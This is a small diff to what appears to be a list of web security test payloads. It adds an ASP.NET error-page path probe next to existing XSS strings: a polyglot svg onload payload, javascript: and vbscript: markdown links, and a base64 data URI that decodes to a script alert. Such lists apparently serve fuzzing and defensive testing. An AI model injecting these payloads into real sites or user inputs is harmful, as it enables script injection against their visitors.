@@ -44,6 +44,7 @@ jaVasCript:/*--></title></style></textarea></script></xmp><svg/onload=alert(1)>
 ![Img](javascript:alert(1))
 [Link](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=)
 [Hover](vbscript:msgbox('XSS'))
+Erro404.aspx?aspxerrorpath=
 
 
 ```
